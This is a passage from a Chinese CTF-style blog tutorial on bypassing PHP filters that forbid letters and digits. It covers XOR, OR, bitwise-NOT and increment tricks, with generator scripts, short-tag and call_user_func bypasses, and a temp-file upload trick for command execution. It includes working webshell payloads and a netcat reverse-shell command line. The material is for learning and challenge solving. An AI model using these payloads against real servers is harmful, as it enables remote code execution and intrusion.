最后要对结果进行一个url编码</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/FCjqc2XBkuMzaVv.png" alt="image-20230706211442786.png"></p><p>记得url编码</p><p>PHP7下面构造一个反引号</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">`<span class="hljs-symbol">$</span>_POST[_]`     <span class="hljs-symbol">$</span>_=<span class="hljs-string">&quot;!+/((&quot;</span>^<span class="hljs-string">&quot;~&#123;`&#123;|&quot;</span>;<span class="hljs-symbol">$</span>__=<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_;`<span class="hljs-symbol">$</span>__[_]`;<br></code></pre></td></tr></table></figure><p>然后这个利用到了反弹shell _=nc ip 监听端口号 -e /bin/bash</p><h2 id="或"><a href="#或" class="headerlink" title="或  |"></a>或  |</h2><p>有1则为1 下面是脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">import re<br>import urllib<br><span class="hljs-keyword">from</span> urllib import parse<br>hex_i = <span class="hljs-string">&quot;&quot;</span><br>hex_j = <span class="hljs-string">&quot;&quot;</span><br>pattern=<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>    <span class="hljs-comment">//这个地方是根据题目进行一个正则匹配</span><br>str1=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;cat flag.php&quot;</span>]    <span class="hljs-comment">//进行命令执行的</span><br><span class="hljs-keyword">for</span> p in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">2</span>):<br>    t1 = <span class="hljs-string">&quot;&quot;</span><br>    t2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> k in str1[p]:<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> j in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(i)) :<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(j)) :<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                    hex_i = <span class="hljs-string">&quot;0&quot;</span> + <span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_i=<span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">if</span> j &lt; <span class="hljs-number">16</span>:<br>                    hex_j=<span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_j=<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                hex_i=<span class="hljs-string">&#x27;%&#x27;</span>+hex_i<br>                hex_j=<span class="hljs-string">&#x27;%&#x27;</span>+hex_j<br>                c=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_i))|<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_j)))<br>                <span class="hljs-keyword">if</span>(c ==k):<br>                    t1=t1+hex_i<br>                    t2=t2+hex_j<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;(\&quot;&quot;</span>+t1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="hljs-string">&quot;\&quot;)&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>~() 会对括号里面的东西进行一个取反  如果原本是0b1001  经过取反后是 0b0110</p><p><img src="https://s2.loli.net/2023/08/25/hNUTOxH4enmrPLQ.png" alt="image-20230706221417162.png"></p><p>有中文的也有url编码的  </p><p>下面用url的来讲一下：</p><p><img src="https://s2.loli.net/2023/08/25/6egkZrpwcUoJICP.png" alt="image-20230706222401719.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_=assert $__=_POST      不用在再url了   这个是在php5下<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;_POST&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>php7下是反引号 进行反弹shell</p><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>先来一个简单的代码来理解一下什么是自增</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;A&#x27;</span>;<br>++<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//运行结果是B</span><br></code></pre></td></tr></table></figure><p>这个++之前c语言的时候就学习过了 我们如果获取到了首字母A的话那么任意一个字母我们都可以通过自增的方法来获取</p><p>但是在无数字字母中我们不能有字母 那么该如何获取A呢？ 这里要用到了数组 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;   <span class="hljs-comment">//运行结果是Array</span><br></code></pre></td></tr></table></figure><p>但是我们获得的是整个数组 它并不是一个字符串 所以单一个字母A我们是拿不到的 这里在数组后面加一个’’ 这样就会被当作字符串了 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]; <br><span class="hljs-comment">//运行结果是A</span><br></code></pre></td></tr></table></figure><p>还有一个问题 既然是无数字字母的话 这个0就不应该有了 我们找一个不存在的变量 为假 也就是0 这样就可以代替了   然后变量名用_ 来代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-comment">//运行结果是A</span><br></code></pre></td></tr></table></figure><p>在php5中我们可以用<code>assert($_POST[_])</code> 来进行一个命令执行</p><p>然后这个assert和_POST  都可以利用自增进行构造出来</p><p>下面讲一下构造的思路 </p><p>上面的既然可以运算出A 我们也可以运算出S 前置是先把A这个值赋给几个变量 方便后续的构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   这个三个下划线的被赋值成了A<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;  <br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;    <span class="hljs-regexp">//</span>然后两个下划线的和一个下划线的都被赋值成了A  这里是为什么 下面拼接的时候就能看出作用了 <br></code></pre></td></tr></table></figure><p>OK 下面就来构造S吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>;<br>这个<span class="hljs-variable">$_</span> 就是S 上面那些就是一个增加的  从A到S<br></code></pre></td></tr></table></figure><p>然后先构造ASS   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br></code></pre></td></tr></table></figure><p>如果我们要构造E的话首先要把$_ 重新定义成A 上面得$___ 它得值还没有变 根据这个 把<code>$_</code>重新定义成A</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br><br></code></pre></td></tr></table></figure><p>下面的都是那样 就不再多说了</p><p>然后下面有一个自增构造的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$cmd2</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;post&#x27;</span>]);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$_ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC2</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$____ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-variable">$POC_pat7</span> = <span class="hljs-string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat7</span>;<br>    <span class="hljs-title function_ invoke__">POC</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd2</span>))&#123;<br>    <span class="hljs-title function_ invoke__">POC2</span>(<span class="hljs-variable">$cmd2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果要构造<code>assert($_POST[_])</code> 的话 就让cmd=assert post=POST</p><p>有四个下划线的是post的 一个下划线的是cmd的</p><h1 id="特殊符号过滤"><a href="#特殊符号过滤" class="headerlink" title="特殊符号过滤"></a>特殊符号过滤</h1><h3 id="1-对下划线进行一个过滤"><a href="#1-对下划线进行一个过滤" class="headerlink" title="1.对下划线进行一个过滤"></a><strong>1.对下划线进行一个过滤</strong></h3><p>这个可以利用短标签进行一个绕过</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`$_GET[_]`</span><span class="hljs-string">?&gt;</span>  可以将_GET进行一个取反 然后 将_也进行一个取反 <br><br>转换成=&gt;  <span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span>&#123;<span class="hljs-variable">$&#123;</span>~<span class="hljs-string">&quot;取反后的字符&quot;</span>&#125;[%a0]&#125;<span class="hljs-string">?&gt;</span>   然后就可以进行一个命令执行  同时改成<span class="hljs-variable constant_">POST</span>也是可以的 只不过将后面的参数换成一个 - 号就行了<br></code></pre></td></tr></table></figure><p>当然异或也是可以的</p><h3 id="2-下划线和-被过滤了"><a href="#2-下划线和-被过滤了" class="headerlink" title="2.下划线和$被过滤了"></a><strong>2.下划线和$被过滤了</strong></h3><p><strong>php7下：</strong></p><p>利用函数<strong>call_user_func()</strong>  进行一个绕过   只在php7后有效($a)();</p><p>call_user_func(‘调用的函数’,’传入的值’)</p><p>对它进行一个取反绕过</p><p>call_user_func =&gt; %9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C</p><p>system =&gt; %8C%86%8C%8B%9A%92</p><p>ls =&gt; %93%8C</p><p>(<del>%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(</del>%8C%86%8C%8B%9A%92,~%93%8C);  =&gt;(call_user_func)(system,ls);</p><p><img src="https://s2.loli.net/2023/08/25/9kGCNawZQonDh1U.png" alt="image-20230707160430309.png"></p><p><strong>在php5下：</strong></p><p>利用了一个上传临时文件</p><p>参考大佬博客：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>. file(文件名) 是用来执行一个文件的  </p><p>这个在php5下的绕过思路就是 上传一个文件 php会将我们上传的文件默认保存在/tmp/phpxxxxxx目录下 （xxxxxx 是六个随机的大小写字母）</p><p>然后我们通过通配符? 利用.file 去读取我们上传的文件  这个上传的文件是可控的 所以就可以进行命令执行   大体思路就是这个</p><p>? 代表任意一个字符    </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">``</span>可以用来进行命令执行     <span class="hljs-string">`./???/?????????`</span><br></code></pre></td></tr></table></figure><p>但是这个有不可预知性 可以查的范围太广了    我们注意到后面的xxxxxx是六位随机的大小写字母 在linux中 glob支持利用 [0-9]来表示一个范围</p><p>在ascii码表中  @-[  表示所有大写字母的范围 所以可以利用  [@-[]   我们可以让最后一位是大写的然后这样范围就进一步的缩小了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">`.<span class="hljs-regexp">/???/</span>?????[@-[]`<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/6l8qaihbTgDzH4P.png" alt="image-20230707175309732.png"></p><p>从User-Agent到最后的话可以复制粘贴</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">79.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type:multipart/form-data;boundary=--------123</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Content-Length: 115</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------123</span><br><span class="hljs-comment">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">ls /     //进行命令执行</span><br><span class="hljs-comment">----------123--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h3 id="3-过滤了-amp"><a href="#3-过滤了-amp" class="headerlink" title="3.过滤了~^|;`&amp;"></a><strong>3.过滤了~^|;`&amp;</strong></h3><p>这个时候要用到自增 和短标签结合起来的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">32</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">127</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)))&#123;   <span class="hljs-comment">//这个正则看题目是什么</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>&#125;<br>?    可以看看没有过滤哪些<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
